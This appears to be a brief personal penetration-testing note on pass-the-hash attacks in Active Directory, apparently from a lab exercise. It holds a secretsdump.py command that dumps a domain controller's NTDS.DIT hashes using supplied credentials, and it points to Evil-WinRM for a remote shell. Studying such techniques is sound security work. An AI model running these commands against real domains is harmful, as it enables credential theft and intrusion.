# Pass The Hash
If we have access to credentials belonging to a Domain Controller, we can dump the NTDS.DIT file, giving us hashes for all users in that Domain.

**Dump NTDS.DIT**

```
$ secretsdump.py spookysec.local/backup:backup2517860@10.10.224.44
```

We can remote launch a shell using hashes gained here using [Evil-WinRM](obsidian://open?vault=Security%20%26%20PenTesting&file=Access%2FActive%20Directory%2FEvil%20WinRM)
